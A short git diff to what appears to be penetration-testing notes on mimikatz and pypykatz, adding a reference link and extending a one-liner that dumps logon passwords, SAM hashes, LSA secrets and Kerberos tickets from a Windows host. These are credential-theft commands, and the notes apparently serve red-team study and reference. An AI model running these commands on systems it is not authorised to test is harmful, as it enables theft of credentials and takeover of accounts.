@@ -2,6 +2,8 @@
 
 ### mimikatz/pypykatz
 
+{% embed url="https://adsecurity.org/?page_id=1821" %}
+
 Need to match architecture
 
 ```bash
@@ -10,11 +12,12 @@ privilege::debug
 
 sekurlsa::logonPasswords
 lsadump::sam
+lsadump::sam /patch
 lsadump::lsa /patch
 lsadump::secrets
 kerberos::list
 
-mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam /patch" "lsadump::lsa /patch" "lsadump::secrets" "exit"
 
 pypykatz lsa minidump filename.DMP
 ```
